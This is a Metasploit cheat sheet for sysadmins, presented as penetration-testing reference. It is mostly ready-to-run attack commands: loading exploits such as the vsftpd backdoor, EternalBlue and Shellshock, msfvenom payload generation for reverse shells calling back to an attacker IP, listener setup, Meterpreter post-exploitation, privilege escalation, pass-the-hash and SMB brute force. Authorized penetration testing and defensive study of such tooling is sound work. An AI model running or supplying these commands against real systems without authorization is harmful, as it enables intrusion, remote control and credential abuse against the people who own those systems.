# Metasploit cheat sheet for netadmins/sysadmins

A powerful framework for penetration testing, exploit development, and vulnerability validation—essential for security professionals and sysadmins to assess defenses, simulate attacks, and validate patches.

This cheat sheet covers:

✔ **Exploit selection & execution**\
✔ **Payload generation & delivery**\
✔ **Post-exploitation techniques**\
✔ **Automation & evasion tactics**

## **Metasploit Cheat Sheet**

_Exploitation, Post-Exploitation, and Evasion_

***

### **1. Getting Started**

#### **Launch Metasploit**

bash

```
msfconsole   # Start the framework  
msfdb init   # Initialize database (first run)  
msfdb start  # Start PostgreSQL service  
```

#### **Basic Commands**

bash

```
help          # Show all commands  
search [term] # Find modules (exploits, payloads)  
use [module]  # Select a module  
info          # Show module details  
show options  # Display configurable settings  
```

***

### **2. Exploitation**

#### **Select & Configure an Exploit**

bash

```
use exploit/unix/ftp/vsftpd_234_backdoor  
set RHOSTS 10.0.0.5  
set RPORT 21  
exploit       # Run the exploit  
```

#### **Common Exploits**

bash

```
use exploit/multi/handler                # Generic payload handler  
use exploit/windows/smb/ms17_010_eternalblue  # EternalBlue (WannaCry)  
use exploit/linux/http/apache_mod_cgi_bash  # Shellshock  
```

#### **Set Payload**

bash

```
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST [Your_IP]  # Attacker's IP  
set LPORT 4444       # Listener port  
```

***

### **3. Payloads & Listeners**

#### **Generate Standalone Payloads**

bash

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > payload.exe  
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > payload.elf  
```

#### **Start a Listener**

bash

```
use exploit/multi/handler  
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST 10.0.0.1  
set LPORT 4444  
run  
```

***

### **4. Post-Exploitation**

#### **Meterpreter Basics**

bash

```
sysinfo          # Target system info  
getuid           # Current privilege level  
ps               # List running processes  
migrate [PID]    # Move to another process  
shell            # Drop into OS shell  
```

#### **Privilege Escalation**

bash

```
getsystem        # Attempt auto-privesc (Windows)  
use post/multi/recon/local_exploit_suggester  # Find local exploits  
```

#### **Lateral Movement**

bash

```
use exploit/windows/smb/psexec  # Pass-the-hash  
use auxiliary/scanner/smb/smb_login  # Brute-force SMB  
```

***

### **5. Automation & Reporting**

#### **Resource Scripts**

bash

```
msfconsole -r /path/to/script.rc  # Run pre-configured commands  
```

#### **Generate Reports**

bash

```
db_export -f xml /path/to/report.xml  # Export findings  
```

***

### **Quick Reference Table**

| **Command**               | **Description**                        |
| ------------------------- | -------------------------------------- |
| `search cve:2023`         | Find exploits by CVE year              |
| `setg RHOSTS 10.0.0.0/24` | Set global target range                |
| `sessions -l`             | List active sessions                   |
| `sessions -i [ID]`        | Interact with a session                |
| `background`              | Send Meterpreter session to background |

***

**Pro Tips:**\
✔ Use `check` to test if a target is vulnerable before exploitation.\
✔ Combine with `Nmap`/`OpenVAS` for reconnaissance.\
✔ Always operate within **legal boundaries**—get permission!

**Learn More:**

* `man msfconsole`
* [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
